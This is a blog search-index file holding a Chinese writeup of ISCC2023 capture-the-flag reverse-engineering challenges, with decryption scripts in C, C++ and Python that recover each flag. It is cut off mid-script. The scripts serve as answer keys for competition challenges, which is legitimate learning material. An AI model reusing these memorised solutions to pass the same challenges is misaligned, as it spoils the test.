<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ISCC2023 练武题部分RE&amp;PWN writeup</title>
    <link href="/2023/07/26/iscc2023/"/>
    <url>/2023/07/26/iscc2023/</url>
    
    <content type="html"><![CDATA[<h1 id="ISCC2023-练武题部分RE-amp-PWN-writeup"><a href="#ISCC2023-练武题部分RE-amp-PWN-writeup" class="headerlink" title="ISCC2023 练武题部分RE&amp;PWN writeup"></a>ISCC2023 练武题部分RE&amp;PWN writeup</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="JustDoIt"><a href="#JustDoIt" class="headerlink" title="JustDoIt"></a>JustDoIt</h3><p>查看程序信息是32位的exe文件，直接IDA中打开，对其进行分析后将一些函数和变量重命名便于分析<br> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-0.png" alt="iscc2023-0"><br> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-1.png" alt="iscc2023-1"><br>发现主要的加密逻辑在encode函数中，input的内容经过encode加密后和data进行比较，对encode的函数的算法进行逆向，再将data和key传入即可解密，编写脚本如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">char</span> *input, <span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> len)</span><br>&#123;<br>    <span class="hljs-type">int</span> i, j, k, m, v4;<br>    <span class="hljs-keyword">for</span> (m = len - <span class="hljs-number">1</span>; m &gt; <span class="hljs-number">0</span>; --m) &#123;<br>        input[m] ^= *key;<br>        input[m] -= key[m % <span class="hljs-number">4</span>] % <span class="hljs-number">5</span>;<br>        input[m] = input[m] + key[<span class="hljs-number">2</span>] % <span class="hljs-number">6</span> + key[<span class="hljs-number">3</span>] / <span class="hljs-number">6</span>;<br>        input[m] -= key[<span class="hljs-number">1</span>] / <span class="hljs-number">7</span> + *key % <span class="hljs-number">7</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (k = len - <span class="hljs-number">1</span>; k &gt; <span class="hljs-number">0</span>; --k) &#123;<br>        input[k] -= k;<br>    &#125;<br>    v4 = input[len - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (j = len - <span class="hljs-number">2</span>; j &gt;= <span class="hljs-number">0</span>; --j) &#123;<br>        input[j + <span class="hljs-number">1</span>] = input[j];<br>    &#125;<br>    input[<span class="hljs-number">0</span>] = v4;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; ++i) &#123;<br>        input[i] += <span class="hljs-number">60</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> data[] = &#123;<br>            <span class="hljs-number">0x17</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x1A</span> ,<span class="hljs-number">0x69</span><br>    &#125;;<br>    <span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;ISCC&quot;</span>;<br>    decrypt(data,key,<span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,data);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="变形记"><a href="#变形记" class="headerlink" title="变形记"></a>变形记</h3><p>查看程序信息是32位的exe文件，IDA打开后发现程序应该是经过高优化的cpp，在程序中发现等号开头的字符串，可以猜测是逆序后的base64编码，但整体静态分析困难于是采用动态调试进行分析<br>输入8个a后跟踪输入内容，发现在后续执行出现了a8还有YTg&#x3D;，也就是a8的base64编码</p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-2.png" alt="iscc2023-2"> </p><p>之后又出现了程序中明文逆序后的base64</p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-3.png" alt="iscc2023-3"> </p><p>猜测程序会根据输入字母连续的数量，变成对应的字母+数字形式，base64后与明文逆序后的base64进行比较，如果相等则输入正确，之后通过多个输入样例验证猜想，发现基本一致，如果字母只有一个，没有出现连续，则没有后面的数字</p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-4.png" alt="iscc2023-4"> </p><p>因此可以编写解密脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>enc = <span class="hljs-string">&#x27;=M3YzVlQ5N2c6FWeRJTYzZnQhJjQ&#x27;</span><br>enc = enc[::-<span class="hljs-number">1</span>]<br>txt = base64.b64decode(enc).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment">#print(txt)</span><br><br>num = <span class="hljs-string">&#x27;0123456789&#x27;</span><br>p = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(txt)-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> txt[i] <span class="hljs-keyword">in</span> num:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> txt[i+<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> num:<br>        p += txt[i]<br>    <span class="hljs-keyword">else</span>:<br>        p += txt[i]*(<span class="hljs-built_in">ord</span>(txt[i+<span class="hljs-number">1</span>])-<span class="hljs-number">0x30</span>)<br>        <span class="hljs-comment">#print(p)</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ISCC&#123;&#x27;</span>+p+txt[<span class="hljs-built_in">len</span>(txt)-<span class="hljs-number">1</span>]+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="《狂彪》-1"><a href="#《狂彪》-1" class="headerlink" title="《狂彪》-1"></a>《狂彪》-1</h3><p>首先对synthesis程序进行逆向分析64位的ELF文件，程序逻辑中发现需要material和product并且需要反应过程，查看另外两个文件发现是Cairo Reverse，从recipe获取必要func的类型的参数，func get_processx一共有两种类型，一种是平方，另一种是三次方</p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-5.png" alt="iscc2023-5"></p><p>从recipe_compiled.json获取大质数以及不同材料对应的参数</p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-6.png" alt="iscc2023-6"></p><p>编写脚本求上述所需内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get1</span>(<span class="hljs-params">x,y</span>):<br>    p = <span class="hljs-number">0x800000000000011000000000000000000000000000000000000000000000001</span><br>    t = y - p   <br>    flag = long_to_bytes(x + t ** <span class="hljs-number">2</span>)   <br>    <span class="hljs-built_in">print</span>(flag)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get2</span>(<span class="hljs-params">x,y</span>):<br>    p = <span class="hljs-number">0x800000000000011000000000000000000000000000000000000000000000001</span><br>    t = p - y<br>    flag = long_to_bytes(x + t ** <span class="hljs-number">3</span>)   <br>    <span class="hljs-built_in">print</span>(flag)<br><br>get1(<span class="hljs-number">0x342d632f16ffb39ea1c9ff43c5fd</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffffff86d97ac3b68</span>)<br>get1(<span class="hljs-number">0x4168c574ea889d901813f732</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffffffdd7996ba75d</span>)<br>get1(<span class="hljs-number">0x537660c40b480f3f9d536943af3d1d</span>,<span class="hljs-number">0x800000000000010ffffffffffffffffffffffffffffffffffefdab85793eef8</span>)<br>get1(<span class="hljs-number">0x6f660865f9b7ac5f2151347c1dfa63ff74f2d353a9e012f36603f26e69bb81</span>,<span class="hljs-number">0x800000000000010ffffffffffffffffffc7a968ba59673b1ccc65657cc46597</span>)<br>get1(<span class="hljs-number">0x5769491b82af24d9c7a51fea1f3dfd</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffff96a87dcc85c68</span>)<br>get1(<span class="hljs-number">0x4f765a4dd1b64b37bfffee543fe821901b91bffcfb</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffca971685c93ddca6676</span>)<br>get1(<span class="hljs-number">0x4469656c732d416c646471de4768244dbc0502ad</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffffffeffdeeca462</span>)<br>get1(<span class="hljs-number">0x4f6c60bd9cb557174a4b36d29d740d45e3</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffdd768b9a5c3a2ad</span>)<br>get2(<span class="hljs-number">0x4b72494bd06e442a4b6e3337e5c3554881796337902326</span>,<span class="hljs-number">0x800000000000010ffffffffffffffffffffffffffffffffff8b79567c93dccf</span>)<br>get2(<span class="hljs-number">0x526f71b17463ac25adc0329705cbaff72086423381e19e9207f75726</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffff86ad759a3cb59bbcf</span>)<br>get2(<span class="hljs-number">0x4744387d915d3e20eb63195f4ee8e18d86</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffffffc6978b46977</span>)<br>get2(<span class="hljs-number">0x2046616c629a738c4fa8c39659665c754c516e</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffffffdd78b3c6689</span>)<br>get2(<span class="hljs-number">0x4c73b9f514a9afdf757e18020f8cae</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffffffff87a9756b5</span>)<br>get2(<span class="hljs-number">0x46694cdd71c40446da2dd7241b54f1acb0a0882da7f2a1736e4560416e</span>,<span class="hljs-number">0x800000000000010ffffffffffffffffffffffffffffff77d5936eee1cc5c1c9</span>)<br>get2(<span class="hljs-number">0x1c87779e71ce885c2c59b33bde07571630f7</span>,<span class="hljs-number">0x800000000000010ffffffffffffffffffffffffffffffffffff6c95738b199a</span>)<br>get2(<span class="hljs-number">0x476c61736572293f6be76d101d052d743a5fbf</span>,<span class="hljs-number">0x800000000000010fffffffffffffffffffffffffffffffffffffffe68719067</span>)<br></code></pre></td></tr></table></figure><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-7.png" alt="iscc2023-7"></p><p>得到了反应原料、反应步骤。之后根据material和product搜索4-chloroisatin制Ammosamide B的方法</p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-8.png" alt="iscc2023-8"></p><p>发现整个只用到了Wittig Reaction，Rosenmund-von Braun Reaction，Fischer-Speier Esterification三个反应分别对应process3,8,12，将程序原数按process顺序计算后，带入va发现成功过判断，最后带入getflag函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br>__int64 __fastcall <span class="hljs-title function_">Material</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a1 + <span class="hljs-number">0xEC65771672229</span>LL;<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">process3</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a1 ^ <span class="hljs-number">0x9625A51F09</span>LL;<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">process8</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a1 + <span class="hljs-number">0x2B26652918</span>LL;<br>&#125;<br><br>__int64 __fastcall <span class="hljs-title function_">process12</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a1 ^ <span class="hljs-number">0x797CD6F373251D89</span>LL;<br>&#125;<br><br><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">get_flag</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *a2, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *a3)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s%d_%s_%lld_%s%s\n&quot;</span>, <span class="hljs-string">&quot;ISCC&#123;&quot;</span>, (a1 % <span class="hljs-number">100000</span> % <span class="hljs-number">2</span>) ^ (<span class="hljs-number">2</span> * (a1 % <span class="hljs-number">100000</span>)), a2, a1, a3, <span class="hljs-string">&quot;&#125;&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>&#125;<br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    __int64 material = <span class="hljs-number">0x796B159ACD626B88</span>;<br>    material = Material(material);<br>    material = process3(material);<br>    material = process8(material);<br>    material = process12(material);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llx\n&quot;</span>,material);<br>    get_flag(<span class="hljs-number">0x50d7c32f4a659</span>,<span class="hljs-string">&quot;4-chloroisatin&quot;</span>,<span class="hljs-string">&quot;Ammosamide B&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="奇门遁甲"><a href="#奇门遁甲" class="headerlink" title="奇门遁甲"></a>奇门遁甲</h3><p>按顺序进不同的门能获得碎片，switch里一共有8个，按照程序逻辑顺序，也就是order的12345678，取出函数内字符串后拼起来套上ISCC{}即可。</p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-9.png" alt="iscc2023-9"></p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-11.png" alt="iscc2023-11"></p><p>如果硬要探究逻辑部分也可以，程序很长很复杂，动调然后直接找check部分，与程序中出现的明文值比较<br>翻找上面函数有md5加密的函数，通过对常量值交叉引用发现对常量值进行了魔改，也就是按照程序逻辑顺序得到的字符串拼接起来，经过程序内魔改常量的md5加密后于明文值比较。</p><h3 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h3><p>对程序简单分析重命名后可以发现，整体只有一个encode函数对输入做了加密，之后与v8进行比较，因此只需要探究encode函数算法，对其算法进行逆向即可</p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-12.png" alt="iscc2023-12"></p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-14.png" alt="iscc2023-14"></p><p>观察其内部主要算法涉及取余，采用爆破更加合适，编写脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">data = [<span class="hljs-number">0x28</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x73</span>]<br>strs = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">23</span>):<br>        <span class="hljs-keyword">if</span> j &gt;= <span class="hljs-number">20</span>:<br>                strs += <span class="hljs-built_in">chr</span>(data[j]-j+<span class="hljs-number">32</span>)<br>        <span class="hljs-keyword">else</span>:<br>                k =  j % <span class="hljs-number">4</span> <br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>                        final = i<br>                        i-=<span class="hljs-number">32</span><br>                        i+=j<br>                        <span class="hljs-keyword">if</span> j//<span class="hljs-number">4</span> == <span class="hljs-number">0</span>:<br>                                temp =i + (k ^ -(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;ISCC&quot;</span>[k]) % <span class="hljs-number">4</span>))<br>                                <span class="hljs-keyword">if</span> temp == data[j]:<br>                                        <span class="hljs-built_in">print</span>(j,final)<br>                                        strs += <span class="hljs-built_in">chr</span>(final)<br>                                        <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">elif</span> j//<span class="hljs-number">4</span> == <span class="hljs-number">1</span>:<br>                                temp =i + (<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;ISCC&quot;</span>[k]) % <span class="hljs-number">5</span>)<br>                                <span class="hljs-keyword">if</span> temp == data[j]:<br>                                        <span class="hljs-built_in">print</span>(j,final)<br>                                        strs += <span class="hljs-built_in">chr</span>(final)<br>                                        <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">elif</span> j//<span class="hljs-number">4</span> == <span class="hljs-number">2</span>:<br>                                temp = i + (<span class="hljs-number">2</span>*k)<br>                                <span class="hljs-keyword">if</span> temp == data[j]:<br>                                        <span class="hljs-built_in">print</span>(j,final)<br>                                        strs += <span class="hljs-built_in">chr</span>(final)<br>                                        <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">elif</span> j//<span class="hljs-number">4</span> == <span class="hljs-number">3</span>:<br>                                temp = i + data[k+<span class="hljs-number">4</span>]<br>                                <span class="hljs-keyword">if</span> temp == data[j]:<br>                                        <span class="hljs-built_in">print</span>(j,final)<br>                                        strs += <span class="hljs-built_in">chr</span>(final)<br>                                        <span class="hljs-keyword">break</span><br>                        <span class="hljs-keyword">elif</span> j//<span class="hljs-number">4</span> == <span class="hljs-number">4</span>:<br>                                temp = i + (<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;ISCC&quot;</span>[k]) // <span class="hljs-number">5</span>)<br>                                <span class="hljs-keyword">if</span> temp == data[j]:<br>                                        <span class="hljs-built_in">print</span>(j,final)<br>                                        strs += <span class="hljs-built_in">chr</span>(final)<br>                                        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(strs)<br></code></pre></td></tr></table></figure><h3 id="Pull-the-Wool-Over-People’s-Eyes"><a href="#Pull-the-Wool-Over-People’s-Eyes" class="headerlink" title="Pull the Wool Over People’s Eyes"></a>Pull the Wool Over People’s Eyes</h3><p>IDA打开后发现又是与前面题类似的cpp文件，通过静态+动调先对程序的基本功能进行分析，对相应变量及函数进行重命名，找到了如下两个关键函数和字符串，以及进行加密逻辑的异或运算</p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-15.png" alt="iscc2023-15"></p><p>发现输入长度为20，输入流紧接着的sort_string函数是对里面明文字符串YouAresoClever进行ascii从小到大排序之后，与输入两者异或得到另一个data，之后对其进行二进制转化，与程序中的明文二进制进行比较。</p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-16.png" alt="iscc2023-16"></p><p>判断是与程序中明文0和1组成的字符串进行比较，因此直接将二进制转化为方便运算的16进制数，编写解密脚本即可</p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-17.png" alt="iscc2023-17"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-built_in">bytearray</span>([<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">0x0a</span>,<span class="hljs-number">0x2d</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x5c</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x00</span>])<br>key = <span class="hljs-string">b&quot;ISCC&#123;ACYeeeloorrsuv&#125;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data[i] ^ key[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="Congratulations"><a href="#Congratulations" class="headerlink" title="Congratulations"></a>Congratulations</h3><p>对程序简单分析，发现main中有两个加密函数，进入函数查看功能后，对其进行重命名，发现输入的内容先经过凯撒加密后，再进行自定义加密内容，与data的值进行比较。直接从data逆向算法即可</p><p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-18.png" alt="iscc2023-18"></p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-19.png" alt="iscc2023-19"></p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-20.png" alt="iscc2023-20"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data, <span class="hljs-type">char</span> *key, <span class="hljs-type">int</span> len)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j,k;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; ++i)&#123;<br>        data[i] ^= key[<span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (j = len - <span class="hljs-number">2</span>; j &gt;= <span class="hljs-number">0</span>; --j)&#123;<br>        data[j] += data[j + <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; len - <span class="hljs-number">1</span>; ++k)&#123;<br>        data[k] += <span class="hljs-number">30</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Caesar</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *text, <span class="hljs-type">int</span> a2)</span></span>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> v4[<span class="hljs-number">36</span>];<br>    <span class="hljs-type">char</span> v5[<span class="hljs-number">32</span>];<br>    <span class="hljs-built_in">memcpy</span>(v5, <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>, <span class="hljs-number">26</span>);<br>    <span class="hljs-built_in">memcpy</span>(v4, <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>, <span class="hljs-number">26</span>);<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>    &#123;<br>        <span class="hljs-keyword">if</span> ( !text[i] )<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( text[i] &lt; <span class="hljs-number">97</span> || text[i] &gt; <span class="hljs-number">122</span> )<br>        &#123;<br>            <span class="hljs-keyword">if</span> ( text[i] &gt;= <span class="hljs-number">65</span> &amp;&amp; text[i] &lt;= <span class="hljs-number">90</span> )<br>                text[i] = v4[(text[i] - <span class="hljs-number">65</span> + a2 + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span>];<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            text[i] = v5[(text[i] - <span class="hljs-number">97</span> + a2 + <span 